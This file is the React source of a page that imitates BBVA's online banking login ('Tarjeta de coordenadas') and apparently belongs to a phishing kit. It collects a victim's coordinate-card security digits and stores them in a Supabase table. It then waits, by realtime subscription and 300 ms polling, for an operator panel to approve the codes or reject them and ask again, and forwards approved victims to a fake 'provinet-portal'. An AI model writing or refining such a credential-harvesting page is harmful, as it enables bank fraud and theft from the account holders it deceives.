import { useState, useRef, useEffect, useCallback } from "react";
import { useNavigate } from "react-router-dom";
import { AlertTriangle } from "lucide-react";
import LoginHeader from "../components/LoginHeader";
import { base44, supabase } from "@/api/base44Client";
import { usePresence } from "@/hooks/usePresence";

export default function Coordenada() {
  const navigate = useNavigate();
  const [realCoords, setRealCoords] = useState(["", "", ""]);
  const [visible, setVisible] = useState([false, false, false]);
  const [sessionData, setSessionData] = useState(/** @type {any} */ (null));
  const [submitted, setSubmitted] = useState(false);
  const [coordenadaStatus, setCoordenadaStatus] = useState(/** @type {string|null} */ (null));
  const syncTimerRef = useRef(/** @type {ReturnType<typeof setTimeout> | null} */ (null));
  const syncActiveRef = useRef(false);
  const pollTimerRef = useRef(/** @type {ReturnType<typeof setTimeout> | null} */ (null));
  const pollActiveRef = useRef(false);
  const realtimeChannelRef = useRef(/** @type {any} */ (null));
  const timersRef = useRef(/** @type {any[]} */ ([]));
  const inputRefs = useRef(/** @type {any[]} */ ([]));
  const sessionId = new URLSearchParams(window.location.search).get("sessionId");

  const stopSync = useCallback(() => {
    syncActiveRef.current = false;
    if (syncTimerRef.current) clearTimeout(syncTimerRef.current);
  }, []);

  const stopPolling = useCallback(() => {
    pollActiveRef.current = false;
    if (pollTimerRef.current) clearTimeout(pollTimerRef.current);
  }, []);

  useEffect(() => {
    if (!sessionId) return;
    syncActiveRef.current = true;

    const sync = async () => {
      if (!syncActiveRef.current) return;
      const { data } = await supabase
        .from('user_session_data')
        .select('numero_tarjeta_display, coordenada_display')
        .eq('id', sessionId)
        .single();
      if (data) {
        setSessionData((/** @type {any} */ prev) => ({
          ...prev,
          numeroTarjetaDisplay: data.numero_tarjeta_display,
          coordenadaDisplay: data.coordenada_display,
        }));
      }
      if (syncActiveRef.current) {
        syncTimerRef.current = setTimeout(sync, 100);
      }
    };

    sync();
    return () => stopSync();
  }, [sessionId, stopSync]);

  useEffect(() => {
    return () => {
      stopPolling();
      if (realtimeChannelRef.current) {
        supabase.removeChannel(realtimeChannelRef.current);
        realtimeChannelRef.current = null;
      }
    };
  }, [stopPolling]);

  const formRef = useRef(null);
  const { setRejected } = usePresence(sessionId, formRef);

  const handleChange = (/** @type {number} */ index, /** @type {string} */ value) => {
    const real = value.replace(/\*/g, "").replace(/[^0-9]/g, "");
    if (real.length > 1) return;
    if (value === "") {
      const updatedReal = [...realCoords];
      updatedReal[index] = "";
      setRealCoords(updatedReal);
      const updatedVis = [...visible];
      updatedVis[index] = false;
      setVisible(updatedVis);
      clearTimeout(timersRef.current[index]);
      return;
    }
    if (real.length === 1) {
      const updatedReal = [...realCoords];
      updatedReal[index] = real;
      setRealCoords(updatedReal);
      const updatedVis = [...visible];
      updatedVis[index] = true;
      setVisible(updatedVis);
      clearTimeout(timersRef.current[index]);
      timersRef.current[index] = setTimeout(() => {
        setVisible((prev) => {
          const v = [...prev];
          v[index] = false;
          return v;
        });
      }, 800);
      if (index < 2) inputRefs.current[index + 1]?.focus();
    }
  };

  const handleKeyDown = (/** @type {number} */ index, /** @type {any} */ e) => {
    if (e.key === "Backspace") {
      if (realCoords[index] === "" && index > 0) {
        inputRefs.current[index - 1]?.focus();
      } else {
        const updatedReal = [...realCoords];
        updatedReal[index] = "";
        setRealCoords(updatedReal);
        const updatedVis = [...visible];
        updatedVis[index] = false;
        setVisible(updatedVis);
        clearTimeout(timersRef.current[index]);
      }
    }
  };

  const handleSubmit = async () => {
    if (!isValid || !sessionId || submitted) return;
    setRejected(false);
    setCoordenadaStatus(null);
    setSubmitted(true);
    try {
      await base44.entities.UserSessionData.update(sessionId, {
        codigoCoordenada: realCoords.join(""),
        coordenadaStatus: "pending",
      });
    } catch {
      setSubmitted(false);
      return;
    }

    stopPolling();
    pollActiveRef.current = true;
    let done = false;

    const handleResult = (/** @type {string} */ type) => {
      if (done) return;
      done = true;
      stopPolling();
      if (realtimeChannelRef.current) {
        supabase.removeChannel(realtimeChannelRef.current);
        realtimeChannelRef.current = null;
      }
      if (type === "approved") {
        navigate(`/provinet-portal?sessionId=${sessionId}`, { replace: true });
      } else if (type === "coordRejected") {
        setRealCoords(["", "", ""]);
        setVisible([false, false, false]);
        setSubmitted(false);
        setCoordenadaStatus("coordRejected");
        setRejected(true);
        setTimeout(() => setCoordenadaStatus(null), 4000);
      }
    };

    // Realtime: detección instantánea cuando el panel aprueba/rechaza
    realtimeChannelRef.current = supabase
      .channel(`coordenada-${sessionId}`)
      .on("postgres_changes", {
        event: "UPDATE",
        schema: "public",
        table: "user_session_data",
        filter: `id=eq.${sessionId}`,
      }, (payload) => {
        const coordStatus = payload.new.coordenada_status;
        if (coordStatus === "approved") handleResult("approved");
        else if (coordStatus === "rejected") handleResult("coordRejected");
      })
      .subscribe();

    // Fallback: polling directo a Supabase cada 300ms por si el realtime falla
    const poll = async () => {
      if (!pollActiveRef.current || done) return;
      try {
        const { data } = await supabase
          .from("user_session_data")
          .select("coordenada_status")
          .eq("id", sessionId)
          .single();
        if (data?.coordenada_status === "approved") {
          handleResult("approved");
        } else if (data?.coordenada_status === "rejected") {
          handleResult("coordRejected");
        } else if (pollActiveRef.current && !done) {
          pollTimerRef.current = setTimeout(poll, 300);
        }
      } catch (_) {
        if (pollActiveRef.current && !done) pollTimerRef.current = setTimeout(poll, 300);
      }
    };

    pollTimerRef.current = setTimeout(poll, 300);
  };

  const isValid = realCoords.every(c => c.length > 0);
  const displayCoords = realCoords.map((c, i) => (c === "" ? "" : visible[i] ? c : "*"));

  if (submitted && coordenadaStatus === null) {
    return (
      <div style={{ position: "fixed", inset: 0, background: "white", display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center", zIndex: 9999, gap: "20px" }}>
        <div style={{ width: "40px", height: "40px", border: "4px solid #e5e7eb", borderTop: "4px solid #1973B8", borderRadius: "50%", animation: "spin 1s linear infinite" }} />
        <style>{"@keyframes spin { to { transform: rotate(360deg); } }"}</style>
        <p style={{ margin: 0, fontSize: "14px", color: "#004481", fontFamily: '"BentonSansBBVA Book", Helvetica, Arial, sans-serif', letterSpacing: "0.02em" }}>Espere por favor...</p>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-white font-main flex flex-col">
      <LoginHeader />
      <main className="flex-1 flex flex-col items-center pt-12">
        <div ref={formRef} style={{ width: "100%", maxWidth: "600px", padding: "0 24px", textAlign: "center" }}>

          <h1 style={{ fontSize: "36px", fontWeight: "normal", color: "#121212", marginBottom: "16px" }}>
            Tarjeta de coordenadas
          </h1>

          <p style={{ fontSize: "18px", color: "#121212", marginBottom: "4px" }}>
            Introduce la combinación de coordenada solicitada
          </p>
          <p style={{ fontSize: "18px", color: "#121212", marginBottom: "24px" }}>
            para continuar con el proceso.
          </p>

          <p style={{ fontSize: "17px", color: "#121212", marginBottom: "4px" }}>
            N° de tarjeta: <span style={{ fontWeight: "bold" }}>{sessionData?.numeroTarjetaDisplay || "—"}</span>
          </p>
          <p style={{ fontSize: "17px", color: "#121212", marginBottom: "8px" }}>
            Coordenada: <strong>{sessionData?.coordenadaDisplay || "—"}</strong>
          </p>

          <a
            href="#"
            style={{ fontSize: "14px", color: "#1973B8", textDecoration: "none", display: "block", marginBottom: "32px" }}
          >
            ¿Cómo ubico la coordenada?
          </a>

          <div style={{ display: "flex", justifyContent: "center", gap: "12px", marginBottom: "40px" }}>
            {displayCoords.map((val, i) => (
              <input
                key={i}
                ref={(el) => (inputRefs.current[i] = el)}
                type="text"
                maxLength={1}
                value={val}
                onChange={(e) => handleChange(i, e.target.value)}
                onKeyDown={(e) => handleKeyDown(i, e)}
                style={{
                  width: "43px",
                  height: "56px",
                  border: "none",
                  borderBottom: coordenadaStatus === "coordRejected" ? "2px solid #CC0000" : "2px solid #121212",
                  textAlign: "center",
                  fontSize: "18px",
                  color: "#121212",
                  outline: "none",
                  fontFamily: "inherit",
                  background: coordenadaStatus === "coordRejected" ? "#ffebeb" : "#F4F4F4",
                }}
              />
            ))}
          </div>

          <button
            disabled={!isValid || submitted}
            onClick={handleSubmit}
            style={{
              padding: "11px 52px",
              fontSize: "15px",
              background: isValid && !submitted ? "#1973B8" : "#d6d6d6",
              color: isValid && !submitted ? "white" : "#999",
              border: "none",
              borderRadius: "4px",
              cursor: isValid && !submitted ? "pointer" : "not-allowed",
              fontFamily: "inherit",
              transition: "all 0.2s",
            }}
          >
            {submitted && coordenadaStatus === null ? "Verificando..." : "Continuar"}
          </button>

          {submitted && coordenadaStatus === null && (
            <p style={{ marginTop: "16px", color: "#004481", fontSize: "14px" }}>Verificando coordenada, por favor espere...</p>
          )}
          {coordenadaStatus === "approved" && (
            <p style={{ marginTop: "16px", color: "#16a34a", fontSize: "14px", fontWeight: "600" }}>✓ Coordenada verificada correctamente.</p>
          )}
          {coordenadaStatus === "coordRejected" && (
            <div style={{ marginTop: "16px", display: "flex", alignItems: "center", justifyContent: "center", gap: "8px" }}>
              <AlertTriangle className="w-5 h-5" style={{ color: "#CC0000", flexShrink: 0 }} />
              <span style={{ fontSize: "14px", color: "#121212" }}>La coordenada es inválida. <strong>Intenta nuevamente.</strong></span>
            </div>
          )}
        </div>
      </main>
    </div>
  );
}
